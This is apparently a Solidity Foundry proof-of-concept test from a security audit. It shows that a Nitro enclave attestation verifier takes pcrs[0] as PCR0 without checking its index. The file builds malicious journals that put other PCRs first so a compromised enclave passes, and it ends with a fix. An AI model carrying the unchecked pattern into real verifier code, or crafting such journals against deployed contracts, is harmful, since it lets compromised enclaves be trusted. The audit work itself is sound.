// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {ServiceType} from "../src/types/Types.sol";
import {
    VerifierJournal,
    Pcr,
    Bytes48,
    VerificationResult
} from "aws-nitro-enclave-attestation/interfaces/INitroEnclaveVerifier.sol";

/**
 * @title Proof of Concept: PCR Index Mismatch Attack
 * @notice Demonstrates that the contract assumes pcrs[0] is PCR0 without validation
 * @dev This is a CRITICAL vulnerability if the ZK circuit doesn't enforce PCR ordering
 */
contract PCRIndexMismatchPoC is Test {
    
    /**
     * @dev Simulates the vulnerable PCR hash derivation from EspressoNitroTEEVerifier
     */
    function derivePCR0Hash(VerifierJournal memory journal) 
        public 
        pure 
        returns (bytes32) 
    {
        // THIS IS THE VULNERABLE CODE (line 78-79)
        // Assumes journal.pcrs[0] is PCR index 0, but doesn't check!
        bytes32 pcr0Hash = keccak256(
            abi.encodePacked(
                journal.pcrs[0].value.first,
                journal.pcrs[0].value.second
            )
        );
        return pcr0Hash;
    }
    
    /**
     * @dev ATTACK: Journal has PCR3 in position 0, not PCR0!
     */
    function test_Attack_PCRIndexMismatch() public view {
        console.log("\n=== ATTACK: PCR INDEX MISMATCH ===\n");
        
        // Create MALICIOUS journal where pcrs[0] is actually PCR3!
        Pcr[] memory maliciousPcrs = new Pcr[](1);
        maliciousPcrs[0] = Pcr({
            index: 3,  // ← This is PCR3, not PCR0!
            value: Bytes48({
                first: bytes32(0x1111111111111111111111111111111111111111111111111111111111111111),
                second: bytes16(0x11111111111111111111111111111111)
            })
        });
        
        VerifierJournal memory maliciousJournal = VerifierJournal({
            result: VerificationResult.Success,
            trustedCertsPrefixLen: 1,
            timestamp: uint64(block.timestamp) * 1000,
            certs: new bytes32[](0),
            userData: "",
            nonce: "",
            publicKey: new bytes(65),  // Valid length
            pcrs: maliciousPcrs,
            moduleId: ""
        });
        
        console.log("MALICIOUS JOURNAL:");
        console.log("  journal.pcrs[0].index =", maliciousPcrs[0].index);
        console.log("  (Should be 0, but is 3!)");
        
        // Contract derives "PCR0 hash" from this
        bytes32 derivedHash = derivePCR0Hash(maliciousJournal);
        
        console.log("\nCONTRACT BEHAVIOR:");
        console.log("  Thinks it's validating: PCR0");
        console.log("  Actually validating: PCR3");
        console.log("  Derived hash:", vm.toString(derivedHash));
        
        console.log("\n[!] CRITICAL ISSUE:");
        console.log("  Contract validates wrong PCR!");
        console.log("  PCR0 (code) could be compromised!");
        console.log("  Only PCR3 (custom) was checked!");
    }
    
    /**
     * @dev Show the difference between correct and malicious journals
     */
    function test_Comparison_CorrectVsMalicious() public view {
        console.log("\n=== CORRECT vs MALICIOUS ===\n");
        
        // CORRECT: PCR with index 0
        Pcr[] memory correctPcrs = new Pcr[](1);
        correctPcrs[0] = Pcr({
            index: 0,  // ← Correct!
            value: Bytes48({
                first: bytes32(0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA),
                second: bytes16(0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA)
            })
        });
        
        VerifierJournal memory correctJournal = VerifierJournal({
            result: VerificationResult.Success,
            trustedCertsPrefixLen: 1,
            timestamp: uint64(block.timestamp) * 1000,
            certs: new bytes32[](0),
            userData: "",
            nonce: "",
            publicKey: new bytes(65),
            pcrs: correctPcrs,
            moduleId: ""
        });
        
        bytes32 correctHash = derivePCR0Hash(correctJournal);
        
        console.log("CORRECT JOURNAL:");
        console.log("  journal.pcrs[0].index =", correctPcrs[0].index);
        console.log("  Derived hash:", vm.toString(correctHash));
        console.log("  Validates: PCR0 (code measurement) [OK]");
        
        // MALICIOUS: PCR with index 2 (or 3, or anything != 0)
        Pcr[] memory maliciousPcrs = new Pcr[](1);
        maliciousPcrs[0] = Pcr({
            index: 2,  // ← Wrong! This is PCR2, not PCR0
            value: Bytes48({
                first: bytes32(0xBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB),
                second: bytes16(0xBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB)
            })
        });
        
        VerifierJournal memory maliciousJournal = VerifierJournal({
            result: VerificationResult.Success,
            trustedCertsPrefixLen: 1,
            timestamp: uint64(block.timestamp) * 1000,
            certs: new bytes32[](0),
            userData: "",
            nonce: "",
            publicKey: new bytes(65),
            pcrs: maliciousPcrs,
            moduleId: ""
        });
        
        bytes32 maliciousHash = derivePCR0Hash(maliciousJournal);
        
        console.log("\nMALICIOUS JOURNAL:");
        console.log("  journal.pcrs[0].index =", maliciousPcrs[0].index);
        console.log("  Derived hash:", vm.toString(maliciousHash));
        console.log("  Validates: PCR2 (application data) [WRONG!]");
        
        console.log("\n[!] SECURITY IMPACT:");
        console.log("  Contract thinks it validated PCR0 (code)");
        console.log("  But actually validated PCR2 (application)");
        console.log("  PCR0 could be compromised!");
    }
    
    /**
     * @dev Demonstrate attack scenario with multiple PCRs
     */
    function test_Attack_MultiPCRScenario() public view {
        console.log("\n=== MULTI-PCR ATTACK SCENARIO ===\n");
        
        // Attacker crafts journal with multiple PCRs in WRONG order
        Pcr[] memory mixedPcrs = new Pcr[](3);
        
        // Position 0: PCR3 (custom, benign-looking)
        mixedPcrs[0] = Pcr({
            index: 3,
            value: Bytes48({
                first: bytes32(0x0000000000000000000000000000000000000000000000000000000000000000),
                second: bytes16(0x00000000000000000000000000000000)
            })
        });
        
        // Position 1: PCR0 (code, COMPROMISED!)
        mixedPcrs[1] = Pcr({
            index: 0,
            value: Bytes48({
                first: bytes32(0x6666666666666666666666666666666666666666666666666666666666666666),
                second: bytes16(0x66666666666666666666666666666666)
            })
        });
        
        // Position 2: PCR1 (kernel, also compromised)
        mixedPcrs[2] = Pcr({
            index: 1,
            value: Bytes48({
                first: bytes32(0x9999999999999999999999999999999999999999999999999999999999999999),
                second: bytes16(0x99999999999999999999999999999999)
            })
        });
        
        VerifierJournal memory attackJournal = VerifierJournal({
            result: VerificationResult.Success,
            trustedCertsPrefixLen: 1,
            timestamp: uint64(block.timestamp) * 1000,
            certs: new bytes32[](0),
            userData: "",
            nonce: "",
            publicKey: new bytes(65),
            pcrs: mixedPcrs,
            moduleId: ""
        });
        
        console.log("ATTACK JOURNAL:");
        console.log("  pcrs[0].index =", mixedPcrs[0].index, "(PCR3 - custom)");
        console.log("  pcrs[1].index =", mixedPcrs[1].index, "(PCR0 - code, COMPROMISED!)");
        console.log("  pcrs[2].index =", mixedPcrs[2].index, "(PCR1 - kernel, COMPROMISED!)");
        
        bytes32 validated = derivePCR0Hash(attackJournal);
        
        console.log("\nWHAT CONTRACT VALIDATES:");
        console.log("  Position: pcrs[0]");
        console.log("  Index: 3 (but contract thinks it's 0!)");
        console.log("  Hash:", vm.toString(validated));
        
        console.log("\nWHAT CONTRACT MISSES:");
        console.log("  Actual PCR0 (at position 1): COMPROMISED!");
        console.log("  Actual PCR1 (at position 2): COMPROMISED!");
        
        console.log("\n[!] RESULT:");
        console.log("  Contract approves compromised TEE!");
        console.log("  Thinks it checked PCR0, but checked PCR3!");
    }
    
    /**
     * @dev Show how the fix prevents this
     */
    function test_Fix_ValidatePCRIndex() public view {
        console.log("\n=== THE FIX ===\n");
        
        // Malicious journal
        Pcr[] memory maliciousPcrs = new Pcr[](1);
        maliciousPcrs[0] = Pcr({
            index: 3,  // Wrong!
            value: Bytes48({first: bytes32(0), second: bytes16(0)})
        });
        
        console.log("Attacker's journal:");
        console.log("  pcrs[0].index =", maliciousPcrs[0].index);
        
        console.log("\nVulnerable code:");
        console.log("  [X] No validation");
        console.log("  Uses pcrs[0] blindly");
        
        console.log("\nFixed code:");
        console.log("  [OK] Validates: require(journal.pcrs[0].index == 0)");
        console.log("  Result: REVERTS - Attack blocked!");
        
        // Demonstrate the validation
        uint64 actualIndex = maliciousPcrs[0].index;
        bool wouldPass = (actualIndex == 0);
        
        console.log("\nValidation check:");
        console.log("  Expected index: 0");
        console.log("  Actual index:", actualIndex);
        console.log("  Passes?", wouldPass ? "YES" : "NO");
        
        assertFalse(wouldPass, "Should fail validation");
        
        console.log("\n[OK] Fix prevents PCR index mismatch attack!");
    }
}

